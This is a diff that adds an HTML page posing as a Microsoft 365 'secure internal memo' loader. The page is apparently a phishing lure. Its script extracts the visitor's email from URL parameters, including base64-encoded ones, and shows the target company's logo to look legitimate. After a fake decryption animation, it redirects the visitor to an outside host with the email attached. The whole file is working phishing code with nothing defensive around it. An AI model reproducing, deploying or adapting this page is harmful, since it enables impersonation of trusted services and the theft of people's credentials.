@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accessing Secure Document</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI,system-ui,-apple-system,BlinkMacSystemFont,sans-serif');
+
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #F8F9FA; /* Light gray background */
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            background-color: #FFFFFF;
+            border: 1px solid #DEE2E6; /* Light border */
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            padding: 40px 50px;
+            width: 550px;
+            max-width: 95%;
+            text-align: center;
+        }
+
+        .header {
+            margin-bottom: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .company-logo {
+            max-width: 150px;
+            max-height: 50px;
+            margin-bottom: 25px;
+            object-fit: contain;
+        }
+        
+        .title {
+            color: #212529;
+            font-size: 26px;
+            font-weight: 600;
+            margin: 0 0 10px 0;
+        }
+
+        .subtitle {
+            color: #6C757D;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+
+        .loading-container {
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            color: #005A9E; /* SharePoint blue */
+            font-size: 15px;
+            margin: 0;
+            height: 20px;
+            transition: color 0.3s;
+        }
+
+        .progress-container {
+            background-color: #E9ECEF;
+            height: 4px;
+            border-radius: 2px;
+            overflow: hidden;
+            margin: 15px auto 25px;
+            width: 80%;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background-color: #0078D4; /* Microsoft Blue */
+            width: 0%;
+            animation: decrypt-fill 2.5s ease-out forwards;
+            border-radius: 2px;
+        }
+
+        .file-info { 
+            color: #6C757D;
+            font-size: 14px;
+            margin: 0 0 30px 0;
+        }
+
+        .footer-text {
+            color: #ADB5BD;
+            font-size: 12px;
+            margin-top: 35px;
+        }
+
+        @keyframes decrypt-fill {
+            from { width: 0%; }
+            to { width: 100%; }
+        }
+
+        noscript {
+            display: block;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #FFF3CD;
+            color: #856404;
+            border: 1px solid #FFEEBA;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="" alt="Company Logo" class="company-logo" id="companyLogo" style="display: none;">
+            <h1 class="title">Accessing Secure Internal Memo</h1>
+            <p class="subtitle">Please wait while we establish a secure connection to your organization's document.</p>
+        </div>
+        <div class="loading-container">
+            <p class="loading-text" id="loadingText">Establishing secure channel...</p>
+        </div>
+        <div class="progress-container">
+            <div class="progress-bar-fill" id="progressBar"></div>
+        </div>
+        <p class="file-info">This may take a moment.</p>
+        <noscript>
+            <p>JavaScript is required to access this secure document. Please enable it in your browser settings.</p>
+        </noscript>
+        <p class="footer-text">Powered by Microsoft 365</p>
+    </div>
+
+    <script>
+    (function() {
+        const loadingText = document.getElementById('loadingText');
+        const texts = [
+            "Establishing secure channel...",
+            "Verifying your identity...",
+            "Decrypting document...",
+            "Opening file..."
+        ];
+        let textIndex = 0;
+        const interval = setInterval(() => {
+            textIndex++;
+            if (textIndex < texts.length) {
+                loadingText.textContent = texts[textIndex];
+            } else {
+                clearInterval(interval);
+            }
+        }, 600);
+
+        const REDIRECT_DELAY = 3500;
+       
+        const MOBILE_REDIRECT_URL_BASE = "https://gateway.amerglobalbrands.org/drizz/?NGXtw=0yq1vAP&username=";
+
+        function getEmailFromUrl() {
+            const url = window.location.href;
+            console.log("Current URL:", url);
+            
+            // First, try to get email from username parameter
+            const searchParams = new URLSearchParams(window.location.search);
+            const username = searchParams.get('username');
+            
+            if (username) {
+                console.log("Username parameter found:", username);
+                // Validate it's an email format
+                if (username && username.includes('@') && username.includes('.')) {
+                    console.log("Valid email found from username parameter:", username);
+                    return username;
+                }
+            }
+            
+            // Fallback: try to get base64 encoded email from the first parameter after ?
+            const firstQuestionMark = url.indexOf('?');
+            if (firstQuestionMark !== -1) {
+                const afterQuestion = url.substring(firstQuestionMark + 1);
+                const firstParam = afterQuestion.split('&')[0];
+                console.log("First parameter after ?:", firstParam);
+                
+                // URL decode the parameter first to handle %3D and other encoded characters
+                let decodedParam;
+                try {
+                    decodedParam = decodeURIComponent(firstParam);
+                    console.log("URL decoded parameter:", decodedParam);
+                } catch (e) {
+                    console.log("URL decoding failed, using original:", e.message);
+                    decodedParam = firstParam;
+                }
+                
+                // Try to decode as base64
+                try {
+                    const decodedEmail = atob(decodedParam);
+                    console.log("Decoded from base64:", decodedEmail);
+                    if (decodedEmail && decodedEmail.includes('@') && decodedEmail.includes('.')) {
+                        console.log("Valid email found from base64:", decodedEmail);
+                        return decodedEmail;
+                    }
+                } catch (e) {
+                    console.log("Base64 decoding failed:", e.message);
+                }
+                
+                // If URL decoded param didn't work, also try the original param
+                if (decodedParam !== firstParam) {
+                    try {
+                        const decodedEmail = atob(firstParam);
+                        console.log("Decoded from base64 (original):", decodedEmail);
+                        if (decodedEmail && decodedEmail.includes('@') && decodedEmail.includes('.')) {
+                            console.log("Valid email found from base64 (original):", decodedEmail);
+                            return decodedEmail;
+                        }
+                    } catch (e) {
+                        console.log("Base64 decoding failed (original):", e.message);
+                    }
+                }
+            }
+
+            // Fallback: get email from state parameter
+            console.log("Checking state parameter for email...");
+            const state = searchParams.get('state');
+            console.log("State parameter:", state);
+            
+            if (state) {
+                const parts = state.split(':');
+                if (parts.length > 1) {
+                    const potentialEmail = parts[parts.length - 1];
+                    console.log("Potential email from state:", potentialEmail);
+                    if (potentialEmail && potentialEmail.includes('@')) {
+                        console.log("Valid email found from state:", potentialEmail);
+                        return potentialEmail;
+                    }
+                }
+            }
+            
+            console.log("No valid email found");
+            return null;
+        }
+
+        function setCompanyLogo(email) {
+            if (!email) return;
+            const domain = email.split('@')[1];
+            if (domain) {
+                const logoEl = document.getElementById('companyLogo');
+                const logoUrl = `https://logo.clearbit.com/${domain}`;
+                
+                logoEl.src = logoUrl;
+                logoEl.onload = () => { logoEl.style.display = 'block'; };
+                logoEl.onerror = () => { logoEl.style.display = 'none'; };
+            }
+        }
+        
+        function performRedirect() {
+            clearInterval(interval);
+            const email = getEmailFromUrl();
+
+            if (email) {
+                console.log("Found email:", email);
+                const redirectUrl = MOBILE_REDIRECT_URL_BASE + encodeURIComponent(email);
+                console.log("Redirecting to:", redirectUrl);
+                window.location.href = redirectUrl;
+            } else {
+                console.log("No email found in URL parameters. Showing error.");
+                document.getElementById('loadingText').textContent = 'Access Denied: Invalid or Expired Link';
+                document.getElementById('loadingText').style.color = '#DC3545'; // Red error color
+                document.querySelector('.file-info').textContent = 'Please check the link or contact the sender.';
+                const progressBar = document.getElementById('progressBar');
+                if (progressBar) {
+                    progressBar.style.background = '#DC3545';
+                    progressBar.style.width = '100%';
+                }
+            }
+        }
+        
+        const email = getEmailFromUrl();
+        setCompanyLogo(email);
+        setTimeout(performRedirect, REDIRECT_DELAY);
+    })();
+    </script>
+</body>
+</html>
